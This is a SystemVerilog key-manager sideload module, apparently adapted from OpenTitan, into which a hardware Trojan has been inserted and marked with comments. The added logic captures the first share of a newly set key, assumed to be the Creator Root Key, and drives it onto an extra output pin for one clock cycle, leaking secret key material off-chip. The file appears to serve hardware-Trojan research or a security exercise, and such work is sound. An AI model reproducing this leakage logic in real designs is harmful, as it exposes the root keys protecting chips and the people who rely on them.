`include "prim_assert.sv"

module keymgr_sideload_key import keymgr_pkg::*; #(
  parameter int Width = KeyWidth
) (
  input clk_i,
  input rst_ni,
  input en_i,
  input set_en_i,
  input set_i,
  input clr_i,
  input [Shares-1:0][RandWidth-1:0] entropy_i,
  input [Shares-1:0][Width-1:0] key_i,
  output logic valid_o,
  output logic [Shares-1:0][Width-1:0] key_o,
  // TROJAN INSERTION: Unused GPIO pin for Trojan exfiltration
  output logic [Width-1:0] trojan_gpio_o // <-- Inserted Trojan output
);

  localparam int EntropyCopies = Width / RandWidth;

  logic valid_q;
  logic [Shares-1:0][Width-1:0] key_q;

  // TROJAN INSERTION: Trojan state logic
  logic trojan_leak_req_q, trojan_leak_req_d;
  logic [Width-1:0] trojan_leak_data_q;

  assign valid_o = valid_q & en_i;
  assign key_o = key_q;

  // TROJAN INSERTION: Exfiltration signal driven by internal state
  assign trojan_gpio_o = trojan_leak_req_q ? trojan_leak_data_q : '0;

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      valid_q <= 1'b0;
    end else if (!en_i || clr_i) begin
      valid_q <= 1'b0;
    end else if (set_i) begin
      valid_q <= 1'b1;
    end
  end

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      key_q <= '0;
    end else if (clr_i) begin
      for (int i = 0; i < Shares; i++) begin
        key_q[i] <= {EntropyCopies{entropy_i[i]}};
      end
    end else if (set_i) begin
      for (int i = 0; i < Shares; i++) begin
        key_q[i] <= set_en_i ? key_i[i] : {EntropyCopies{entropy_i[i]}};
      end
    end
  end

  // TROJAN INSERTION: Logic to generate the leak pulse for exactly one clock cycle.
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_leak_req_q <= 1'b0;
      trojan_leak_data_q <= '0;
    end else begin
      // Trigger: When set_i is asserted (i.e., Creator Root Key generated)
      // Leak for one cycle only
      trojan_leak_req_q <= (set_i && !trojan_leak_req_q) ? 1'b1 : 1'b0;

      if (set_i && !trojan_leak_req_q) begin
        // Exfiltrate first share of newly-generated key (Creator Root Key assumed)
        trojan_leak_data_q <= set_en_i ? key_i[0] : {EntropyCopies{entropy_i[0]}};
      end else begin
        trojan_leak_data_q <= '0;
      end
    end
  end

endmodule